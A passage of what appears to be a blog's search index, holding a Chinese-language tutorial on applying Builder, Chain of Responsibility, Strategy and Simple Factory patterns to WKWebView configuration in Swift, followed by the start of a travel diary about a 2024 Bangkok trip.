WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // 模擬商業邏輯：WebViewController deeplinkCheck == true (代表需要過 DeepLinkManager 檢查並開啟頁面) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // 模擬 DeepLinkManager 邏輯，URL 能成功打開則打開並結束流程。 // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // 模擬商業邏輯：WebViewController isHomePage == true (代表是開主頁) &amp; WebView 正在瀏覽首頁，則切換 TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // 模擬商業邏輯：WebViewController noNeedNativePresent == false (代表需要 Match 特殊路徑開原生頁面) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } decisionHandler(.allow) }}// ...問題 設定變數、開關攤在 Class 當中，不清楚哪些是設定使用 直接暴露 WKUserScript 變數設定給外部，我們希望能管控注入的 JS，只允許注入特定行為 無法控制 WKScriptMessageHandler 的註冊規則 如果要 init 差不多的 WebView 需要重複寫注入參數的規則，參數規則無法復用 navigationAction Delegate 內部靠變數控制流程，如果要刪改流程或順序都要動到整個 Code，也可能改壞本來就正常的流程Builder Pattern 建造者模式 Builder Pattern（建造者模式） 屬於 創建型 設計模式，將創建物件的步驟與邏輯分離，操作者可一步一步設定參數並且復用設定，並在最後創建出目標物件，另外同樣的創建步驟也可以創建出不同的對象實現。上圖以製作 Pizza 為例，先將 Pizza 製作的步驟拆成好幾個方法，並宣告在 PizzaBuilder 這個 Protocol (Interface)， ConcretePizzaBuilder 為實際製作 Pizza 的物件，可能為 素食 PizzaBuilder &amp; 葷食 PizzaBuilder ；不同的 Builder 原料可能不一樣，但最終都會 build() 產出 Pizza 物件。WKWebView 場景回到 WKWebView 場景，我們的最終產出物件是 MyWKWebViewConfiguration ，我們把所有 WKWebView 會需要設定的變數全統一放到這個物件當中，並使用 Builder Pattern MyWKWebViewConfigurator 逐步完成 Configuration 的構建工作。public struct MyWKWebViewConfiguration { let headNavigationHandler: NavigationActionHandler? let scriptMessageStrategies: [ScriptMessageStrategy] let userScripts: [WKUserScript] let overrideTitleFromWebView: Bool let url: URL}// 全部參數都只對 Module 內暴露 (Internal)MyWKWebViewConfigurator (Builder Pattern) 這邊因為我只有 Build for MyWKWebView 的需求，因此沒有再把 MyWKWebViewConfigurator 多拆 Protocol(Interface)。public final class MyWKWebViewConfigurator { private var headNavigationHandler: NavigationActionHandler? = nil private var overrideTitleFromWebView: Bool = true private var disableZoom: Bool = false private var scriptMessageStrategies: [ScriptMessageStrategy] = [] public init() { } // 參數封裝、內控 public func set(disableZoom: Bool) -&gt; Self { self.disableZoom = disableZoom return self } public func set(overrideTitleFromWebView: Bool) -&gt; Self { self.overrideTitleFromWebView = overrideTitleFromWebView return self } public func set(headNavigationHandler: NavigationActionHandler) -&gt; Self { self.headNavigationHandler = headNavigationHandler return self } // 可以把新增邏輯規則封裝在裡面 public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } public func build(url: URL) -&gt; MyWKWebViewConfiguration { var userScripts:[WKUserScript] = [] // 產生時才附加 if disableZoom { let script = \"var meta = document.createElement('meta'); meta.name='viewport'; meta.content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'; document.getElementsByTagName('head')[0].appendChild(meta);\" let disableZoomScript = WKUserScript(source: script, injectionTime: .atDocumentEnd, forMainFrameOnly: true) userScripts.append(disableZoomScript) } return MyWKWebViewConfiguration(headNavigationHandler: headNavigationHandler, scriptMessageStrategies: scriptMessageStrategies, userScripts: userScripts, overrideTitleFromWebView: overrideTitleFromWebView, url: url) }}多拆了一層也可以更好的使用 Access Control 隔離參數的使用權限，以本場景為例就是我們希望依然可以直接注入 WKUserScript 到 MyWKWebView 當中，但我們又不希望把開口開的這麼大讓使用的人可以隨意注入，因此結合 Builder Pattern + Swift Access Control，當 MyWKWebView 已經被放 Module 中後 MyWKWebViewConfigurator 對外封裝成操作方法 func set(disableZoom: Bool) ，對內在產生 MyWKWebViewConfiguration 時再附加上 WKUserScript ， MyWKWebViewConfiguration 所有參數對外都是不可更改並且只能透過 MyWKWebViewConfigurator 產生。MyWKWebViewConfigurator + Simple Factory 簡單工廠當有了 MyWKWebViewConfigurator Builder 之後我們可以再建立一個簡單工廠封裝、復用建立步驟。struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Chain of Responsibility Pattern 責任鏈模式 責任鏈模式（Chain of Responsibility Pattern）屬於 行為型 設計模式，它將對象處理的操作封裝並使用鏈式結構串聯起來，請求操作會沿著鏈條傳遞，直到有被處理為止；串聯的操作封裝可以自由彈性的組合、更改順序。 責任鏈專注在東西進來你有沒有要處理，沒有就 Skip ，因此不能處理一半或是修改了輸入物件然後丟給下一個；如果是這種需求那是另一個 Interceptor Pattern 。上圖是以 Tech Support (or OnCall. . ) 為例，問題物件進來之後會先經過 CustomerService 如果他不能處理就往下一層 Supervisor 丟，如果還是不能處理再繼續往下到 TechSupport ；另外也可以針對不同問題組成不同的責任鏈，例如如果是大客戶的問題會直接從 Supervisor 開始處理；在 Swift UIKit 的 Responder Chain 也是使用了責任鏈模式，回應使用者在 UI 上的操作。WKWebView 場景在我們 WKWebView 的場景中，主要是套用在 func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) 這個 Delegate 方法。 當系統收到網址請求時會經過這個方法讓我們決定是否要允許跳轉，並在結束處理後呼叫 decisionHandler(.allow) or decisionHandler(.cancel) 告知結果。在 WKWebView 的實作上就會出現很多判斷或是有的頁面處理跟別人不一樣要繞開：// 原始寫法...func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // 模擬商業邏輯：WebViewController deeplinkCheck == true (代表需要過 DeepLinkManager 檢查並開啟頁面) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // 模擬 DeepLinkManager 邏輯，URL 能成功打開則打開並結束流程。 // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // 模擬商業邏輯：WebViewController isHomePage == true (代表是開主頁) &amp; WebView 正在瀏覽首頁，則切換 TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // 模擬商業邏輯：WebViewController noNeedNativePresent == false (代表需要 Match 特殊路徑開原生頁面) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } // more... decisionHandler(.allow)}隨著時間推移功能越來越複雜，這邊的邏輯也會越來越多，如果又扯到處理順序也要不一樣就會變成一場災難。NavigationActionHandler (Chain of Responsibility Pattern)先定義好 Handler Protocol：public protocol NavigationActionHandler: AnyObject { var nextHandler: NavigationActionHandler? { get set } /// Handles navigation actions for the web view. Returns true if the action was handled, otherwise false. func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool /// Executes the navigation action policy decision. If the current handler does not handle it, the next handler in the chain will be executed. func exeute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void)}public extension NavigationActionHandler { func exeute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { if !handle(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) { self.nextHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) } }} 操作會在 func handle() 實現，如果有接下來處理則回傳 true 否則回傳 false func exeute() 是預設的鏈訪問實現，會從這邊執行遍歷整個操作鏈，預設行為是當 func handle() 為 false (代表此節點無法處理) 則自動呼叫下一個 nextHandler 的 execute() 繼續處理，直到結束。實現：// 預設實現，通常放到最後public final class DefaultNavigationActionHandler: NavigationActionHandler { public var nextHandler: NavigationActionHandler? public init() { } public func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { decisionHandler(.allow) return true }}//final class PaymentNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // 模擬商業邏輯：Payment 付款相關、兩階段驗證 WebView...etc print(\"Present Payment Verify View Controller\") decisionHandler(.cancel) return true }}//final class DeeplinkManagerNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // 模擬 DeepLinkManager 邏輯，URL 能成功打開則打開並結束流程。 // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return true // } else { return false // }}// More...使用：extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { let headNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() let paymentNavigationActionHandler = PaymentNavigationActionHandler() headNavigationActionHandler.nextHandler = paymentNavigationActionHandler paymentNavigationActionHandler.nextHandler = defaultNavigationActionHandler headNavigationActionHandler.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) }}這樣當請求收到後，就會照著我們定義的處理鏈依序處理。結合前面的 Builder Pattern MyWKWebViewConfigurator 將 headNavigationActionHandler 開成參數出去，就能從外部決定這個 WKWebView 的處理需求、順序：extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { configuration.headNavigationHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) }}//...struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: // 模擬預設情況有這些 handler let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let homePageTabSwitchNavigationActionHandler = HomePageTabSwitchNavigationActionHandler() let nativeViewControllerNavigationActionHandlera = NativeViewControllerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() deplinkManagerNavigationActionHandler.nextHandler = homePageTabSwitchNavigationActionHandler homePageTabSwitchNavigationActionHandler.nextHandler = nativeViewControllerNavigationActionHandlera nativeViewControllerNavigationActionHandlera.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .add(scriptMessageStrategy: UserScriptMessageStrategy()) .set(headNavigationHandler: deplinkManagerNavigationActionHandler) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: // 模擬付款頁面只需要這些 handler，並且 paymentNavigationActionHandler 優先權最高 let paymentNavigationActionHandler = PaymentNavigationActionHandler() let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() paymentNavigationActionHandler.nextHandler = deplinkManagerNavigationActionHandler deplinkManagerNavigationActionHandler.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Strategy Pattern 策略模式 策略模式（Strategy Pattern）屬於 行為型 設計模式，它將實際操作抽象出來，我們可以實現多種不同的操作，讓外部可以根據不同場境彈性的替換使用。上圖以不同支付方式為例，我們把支付抽象為 Payment Protocol (Interface)，然後各種支付方式去實現自己的實作，在 PaymentContext (模擬外部使用)時 依據使用者選擇的付款方式，產生對應的 Payment 實體並統一呼叫 pay() 進行支付。WKWebView 場景 在 WebView 與 前端頁面的交互中使用。 當前端 JavaScript 呼叫： window.webkit.messageHandlers.Name.postMessage(Parameters); 就會進到 WKWebView 找到對應 Name 的 WKScriptMessageHandler Class 進入執行操作。系統已經有定義好的 Protocol 跟相應的 func add(_ scriptMessageHandler: any WKScriptMessageHandler, name: String) 方法，我們只需要定義好自己的 WKScriptMessageHandler 實現，並加入到 WKWebView，系統就會依照 Strategy Pattern 策略模式，根據收到的 name 派發給對應的 具體策略 執行。這邊只做簡單的 Protocol extend WKScriptMessageHandler ，多一個 identifier:String for add(.. name:) 使用：public protocol ScriptMessageStrategy: NSObject, WKScriptMessageHandler { static var identifier: String { get }}實現：final class PageScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"page\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // 模擬 called from js: window.webkit.messageHandlers.page.postMessage(\"Close\"); print(\"\\(Self.identifier): \\(message.body)\") }}//final class UserScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"user\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // 模擬 called from js: window.webkit.messageHandlers.user.postMessage(\"Hello\"); print(\"\\(Self.identifier): \\(message.body)\") }}WKWebView 註冊使用：var scriptMessageStrategies: [ScriptMessageStrategy] = []scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier)}結合前面的 Builder Pattern MyWKWebViewConfigurator 從外部管理 ScriptMessageStrategy 的註冊：public final class MyWKWebViewConfigurator { //... // 可以把新增邏輯規則封裝在裡面 public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { // 這邊只有實現重複 identifier 時會先刪除舊的的邏輯 scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } //...}//...public class MyWKWebViewController: UIViewController { //... public override func viewDidLoad() { super.viewDidLoad() //... configuration.scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier) } //... }}Question: 這個場景也可以改用 Chain of Responsibility Pattern 責任鏈模式嗎？到這邊有朋友可能會想問，那這邊的 Strategy Pattern 可以用 Chain of Responsibility Pattern 取代嗎？ 這兩個設計模式同樣是行為型，可以取代；但實際要看需求場景，在這邊是很典型的 Strategy Pattern，WKWebView 依照 Name 去決定要進入的不同 Strategy；如果我們的需求是不同的 Strategy 之間可能有鏈式依賴或是 recover 關係，例如 AStrategy 如果不做要丟給 BStrategy 做，這時候才會考慮使用 Chain of Responsibility Pattern。Strategy v.s. Chain of Responsibility Strategy Pattern：已有明確派發執行策略且策略與策略之間沒有關係。 Chain of Responsibility Pattern：執行策略是在個別實現中決定，如果無法處理則往下丟給下一個實現。複雜場景可以用 Strategy Pattern 裡面再套用 Chain of Responsibility Pattern 組合達成。最終組合 Simple Factory 簡單工廠模式 MyWKWebViewConfiguratorFactory -&gt; 封裝 MyWKWebViewConfigurator 產生步驟 Builder Pattern 建造者模式 MyWKWebViewConfigurator -&gt; 封裝 MyWKWebViewConfiguration 參數、構建步驟 MyWKWebViewConfiguration 注入 -&gt; 給 MyWKWebViewController 使用 Chain of Responsibility Pattern 責任鏈模式 MyWKWebViewController 的 func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; 呼叫 headNavigationHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) 鏈執行處理 Strategy Pattern 策略模式 MyWKWebViewController 的 webView.configuration.userContentController.addUserScript(XXX) 派發對應的 JS Caller 到對應處理的策略中完整 Demo Repo延伸閱讀 Design Patterns 的實戰應用紀錄 Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableView有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 387 Total Views Last Statistics Date: 2025-01-19 | 346 Views on Medium. " }, { "title": "遊記 2024 泰國曼谷 Bangkok 🇹🇭 5 日自由行", "url": "/posts/b7e7c0938985/", "categories": "Z 度旅行遊記", "tags": "生活, travel, travel-writing, bangkok, thailand", "date": "2024-08-25 01:23:20 +0800", "snippet": "[遊記] 2024 泰國曼谷 Bangkok 🇹🇭 5 日自由行疫情後再訪泰國，曼谷五日快閃自由行。曼谷的回憶時間回到 2018 年，出社會的第一份工作第一間公司的員工旅遊、也是我第一次出國，就是去泰國曼谷+華新(5 日)；隔年 2019 同樣跟著公司員旅去沙巴；再來就是被疫情偷走的兩年，疫情結束後就開始瘋日本自由行了。那時候小菜雞一枚、社會經驗 0，矇矇懂懂的跟著哥哥姊姊一起出去，連飛機什...", "content": "[遊記] 2024 泰國曼谷 Bangkok 🇹🇭 5 日自由行疫情後再訪泰國，曼谷五日快閃自由行。曼谷的回憶時間回到 2018 年，出社會的第一份工作第一間公司的員工旅遊、也是我第一次出國，就是去泰國曼谷+華新(5 日)；隔年 2019 同樣跟著公司員旅去沙巴；再來就是被疫情偷走的兩年，疫情結束後就開始瘋日本自由行了。那時候小菜雞一枚、社會經驗 0，矇矇懂懂的跟著哥哥姊姊一起出去，連飛機什麼能帶什麼不能帶都不知道，過安檢的時候還天兵的把護照放籃子上面，出機器的時候發現掉在傳送帶，差點嚇死(如果剛好掉到縫隙就不用回來了)；那次是無腦跟團、無腦坐遊覽車，對曼谷的印象沒有很清晰，只記得高空酒吧很讚、天氣熱、東西便宜、按摩便宜，就沒了，對地理位置也完全沒有概念。因此一直想著有機會要回曼谷舊地重遊，補充六年前的回憶；但是對東南亞不熟悉，不太敢獨旅， 正好年初在跟 Pinkoi 同事嘴砲，就揪成了此次曼谷五日自由行之遊。 2018 年的曼谷+華新五日遊，行程細節與回憶碎片，我放在文末附錄。準備👉👉👉KKday 方案推薦： 昭披耶公主號郵輪自助晚餐｜Chao Phraya Princess River Cruise 曼谷經典一日遊｜美功鐵路和丹嫩莎朵水上市場 | 曼谷出發 【泰國】曼谷包車半日遊｜美功鐵道市場 — 安帕瓦水上市場 — 安帕瓦螢火蟲遊河 曼谷王權 Mahanakhon SkyWalk 觀景台門票 泰國機場 BKK 出境 meet and greet 快速尊榮接待服務 泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK)— — —因為 6 月就已經開始新工作了，沒什麼心思在玩樂上，主要是 Mark 和 Sean 負責安排和規劃，我沒有做太多功課。 ⚠️⚠️⚠️泰國曼谷旅遊安全及注意事項我放在遊記後，可以不看遊記但一定要了解放詐騙跟注意事項還有想碰大麻煩該注意的事。時程安排 2024/08/02 ~ 2024/08/06 Day 1 08/02 : 預計 18:45 抵達曼谷機場 ，到飯店大約 20:00 後，飯店休息或去飯店酒吧 Day 2 08/03 : 昭披耶河一代景點，大皇宮、臥佛寺、玉佛寺、鄭王廟、ICONSIAM、晚上去找 前數字科技(現 Agoda)一哥 Chun-Hsiu Liu Lhao Lhao 吃飯、聽 Rock Pub Live 。 Day 3 08/04 : 恰圖恰市集、王權瑪哈納功大廈、喬德夜市 ( 火山排骨 ) Day 4 08/05 : 逛街購物，Central World、Terminal 21 Day 5 08/06 : 回程， 15:20 的飛機網路這次準備倉促，前一天都還沒準備好網路，也來不及買習慣的實體 SIM 卡，所幸首次嘗試 eSIM。(用完就愛上了)直接上 KKday 買 泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM ，買完直接收到 eSIM 啟用憑證，就能使用了。泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM 限時促銷優惠：即日起至2024年12月31日，活動期間內激活啟用可享高速流量15GB翻倍至30GB，超過30GB後降速至 384 Kbps，不斷網。 AIS 網內無限通話、50泰銖通話額度，使用以下軟體傳文字訊息時，可使用額外流量共10GB(10Mbps)：Tiktok、Wechat及Instagram 有實體號碼、可通話、收簡訊！ 天數計算方式：24小時制，eSIM激活後起算，24小時為一日（泰國時間）。主要是吃到飽、比實體 SIM 卡還便宜，8 日 NT $232。機票 🛫 去程：TPE 16:00 -&gt; BKK 18:45 回程：BKK 15:20 -&gt; TPE 20:10航空公司：Thai VietJet Air 越捷航空 (廉航)價格： TWD $9,259 (包含加購的來回 15 kg 行李托運)當初想說跟大家一起行動，我朋友沒有托運(票價大約在 $6,000 左右)，後來查了一下其他航空公司，感覺虧大了；一般航空公司差不多的時段大約 $10,000 上下，差距不大，但是舒服很多啊！Thai VietJet Air 越捷航空的行李規定其實可以不托運，他可以攜帶兩件手提行李，總重不超過 7 公斤即可。1.手提行李重量：每個乘客（除了嬰兒外）可以帶1件自己的行李和1件小手提行李，最大總重量不得超過07 kg。2.手提行李尺寸：- 01 件具有最大的尺寸為56cm x 36cm x 23cm 的手提行李- 01件小手提行李 (包括如下袋子) + 01個女孩用的袋子，雜誌，照相機，裝嬰兒用的食品袋，具有不得超過30cm x 20cm x 10cm 尺寸的在機場購買的袋子等等。 + 01個裝 外套當打開時不得超過 114cm x 60cm x 11cm尺寸。 + 01個裝筆記本具有尺寸最大為 40cm x 30cm x 10cm 截自 2024/08/22 的資訊，一切以官方最新公告為主。基本上背一個包包＋拖一個登機箱就可以了。8/1 航變通知8/1 晚上 11 點多收到航變通知信，時程改成 16:35 出發，19:20 抵達。住JC KEVIN SATHORN BANGKOK HOTEL 曼谷JC 凯文沙吞酒店 五星級公寓型飯店36 Narathiwas-Ratchanakarin Road, Yannawa, Sathorn, Bangkok, 沙吞, 曼谷, 曼谷, 泰國, 10120 房型： 天際線雙臥室套房 — 有陽台 Skyline 2-Bedroom Suite with Balcony ，後面有開箱影片。 交通：從地圖看距離最近 BTS Chong Nonsi 站 1 公里約 15 分鐘。 價格：NT 31,315 / 4 人 / 4晚。(因為太晚訂，所以很貴，早點可以打到 4–5 折)貨幣同行友人有先換 3,000 THB，我是到當地才去 SuperRich 換。交通在台灣就先註冊好 Grab 、綁定好信用卡，方便直接使用。台灣伴手禮幫 Agoda 一哥準備的台灣味伴手禮。 黑松沙士、麥香奶茶、維他露 P、義美泡芙、蝦味先、維力炸醬面、鳳梨酥、波的多蚵仔煎洋芋片、可樂果、綠色乖乖香港人既Party Room / BBQ場平台 — Common Room預約平台在遊記開始前，先介紹一個最近 香港 新推出的 日租/時租酒店 、 Party Room 包廂、 遊艇趴 . .預約平台 — Common Room 。Common Room無論你是想找個Party Room慶祝、還是要日租酒店/賓館短住，你都可以使用 Common Room平台，輕鬆去尋找你的心儀場地！現在更可以預約香港的船P呀。有要去香港旅遊的朋友，想嘗試不同場地的體驗，可以立即前往看看： Common Room 預約平台 。8/02 Day 1 出發約 12:30 下午下班後從家裡出發 記得務必搭機捷直達車，普通車就算早上車但不會比直達車早到！約 13:30 抵達桃園機場第一航廈報到ˊ櫃檯完全沒人，到了就直接報到+完成托運手續了。又又又是 B1R，最角落＋需要搭接駁車的登機門。離下午四點還很早，又又又來吃一航頂呱呱，這次發現可以單點呱呱包了，以前只賣炸雞！這次才發現原來頂呱呱這邊再往前走直通第二航廈，所以如果很有時間其實可以走去第二航廈吃東西；或是第二航廈跑來第一航廈免費貴賓室休息ＸＤ買完頂呱呱一樣到第一航廈免費貴賓室坐著休息、吃東西，這次看到有人在充電， 上次來看插座都被挖空了，看來是修好了 （？）約 15:30 前往 B1R 候機室不知道是不是廉航的原因，資訊沒更新(一直顯示 16:00，實際已變更到 16:35)。加上班機又延誤，實際起飛時間：17:13。 越捷位子跟虎航差不多大，都比樂桃大，但椅子不好坐、皮沙發材質不透氣、坐太久屁股會痛。 越捷應該是可以吃自己的東西的，回程有人買芒果糯米飯在上面吃也沒怎樣。19:30 抵達曼谷 BKK 素萬那普機場聽同事說才知道曼谷機場如果高峰時間來，可以購買 泰國機場 BKK 出境 meet and greet 快速尊榮接待服務 走快速通關ＸＤ，但我們這時間抵達，幾乎只有同班機的人，所以通關很快。20:00 領完行李、出機場可能因為廉航的關係，沒什麼人托運，行李提領超快。eSIM 網路設定一出機場開始摸索如何設定、啟用 eSIM，才知道… ⚠️eSIM 啟用會需要連接網路⚠️ ⚠️eSIM 啟用會需要連接網路⚠️ ⚠️eSIM 啟用會需要連接網路⚠️有點像買了一把剪刀但是需要另一支剪刀剪開一樣，eSIM 啟用會需要先連接網路從網路啟用；還好同行的朋友在台灣就先啟用 eSIM 了就借他的網路啟用我的 eSIM。(機場也有 Wi-Fi 可用，所以不用太擔心)找到 eSIM 開通信，直接長按 QRCode 選擇 加入 eSIM 即可。 不知道為何，如果把 QRCode 存到相片或備忘錄就沒有此快速加入的功能了，另外的方法是先把 QRCode 傳給同行者或是印出來給手機掃描。iPhone iOS eSIM 手動設定路徑：設定 -&gt; 行動網路 -&gt; 加入 eSIM -&gt; 掃描 QRCode -&gt; 手動輸入資訊 -&gt; 輸入信中資訊 -&gt; 用作. .可以選「旅遊」-&gt; 行動數據選擇使用「旅遊」-&gt; 完成！啟用完成後，等於雙卡雙待，只是說原本的門號 SIM 卡沒買漫遊方案前沒有網路， 緊急情況還可以切回原本的 SIM 卡門號！ AIS 查詢手機號碼請撥打 *545# ，查詢話費餘額請撥打 *121# ，流量查詢請撥打 *121*3#20:30 機場覓食因為到市區、飯店還要一個多小時，廉航沒有供餐，大家都飢腸轆轆，就先在機場覓食吃晚餐了。找了一家泰式餐廳吃一吃，打拋豬好辣好爽、配蔬菜湯可以緩解它的辣。21:00 移動前往飯店 👉👉👉可以參考 KKday 機場接送服務： - 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 - 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK)吃完大約 21:00，開始往市區、飯店移動。搭乘公共運輸需要轉三趟地鐵、BTS： 機場快線 Suvarnabhumi -&gt; Phaya Thai BTS Sukhumvit Line Phaya Thai -&gt; Siam BTS Silom Line Siam -&gt; Chong Nonsi 機場快線只能買票 BTS 可以到人工窗口買兔子卡 (BTS 交通卡) 儲值、刷卡進出站 請注意 兔子卡只能用在 BTS ，不能用在 MRT、機場快線 抵達 Chong Nonsi (後來才知道 王權瑪哈納功大廈 就是這一站啊！)步行前往 JC KEVIN SATHORN BANGKOK HOTEL 曼谷JC 凯文沙吞酒店出 BTS 不要急著下天橋，可以一路從天橋走過馬路。 一路上我覺得很黑暗(沒什麼路燈)，走起來也蠻遠的 (15 mins / 1 KM)，如果一個人晚上走起來挺可怕的 ，途中會經過一家 7–11 跟一個小夜市，在 7–11 買了點吃的帶回飯店。 另外如果搭乘計程車，因雙向道跟迴轉問題，司機要開過飯店一小段到下一個缺口才能迴轉回飯店，所以也稍微麻煩。10:30 JC KEVIN SATHORN BANGKOK HOTEL 曼谷JC 凯文沙吞酒店大約 10:30 抵達飯店。房間非常大，是一整間公寓式的房間，一間主臥、一間次臥、雙衛浴、廚房、客廳、陽台。2018 回憶拍攝於 2018 / iPhone 6想不到這麼巧，2018 年那次跟團員工旅遊來曼谷，大家晚上特別坐計程車來的高空酒吧就是這家飯店的酒吧ＸＤ另外他也有提供 Sky Bar 晚餐組合： 曼谷薩通JC凱文酒店 Zoom Sky Bar 晚餐20242024 / iPhone 15 Pro這次既然都住這裡了，房間放完行李之後也跑上去看看。因早已超過晚餐時間，所以只能點一些下酒菜、串燒食物。8/03 Day 2 臥佛寺、大皇宮、玉佛寺、鄭王廟、ICONSIAM、Lhao Lhao、Rock Pub Live飯店早餐早上吃完飯店早餐後出門，早餐我覺得還行，但選擇不多。9:30 出發因為人多就直接搭 Grab (THB 135) 直接前往臥佛寺。Photo by Florian Wehde中途有經過 唐人街 ，忘了拍照，很有賽博龐克感！ 👉👉👉 也可以考慮 KKday 的： 曼谷私人一日遊：臥佛寺、鄭王廟、大皇宮、玉佛寺泰國。臥佛寺門票：THB 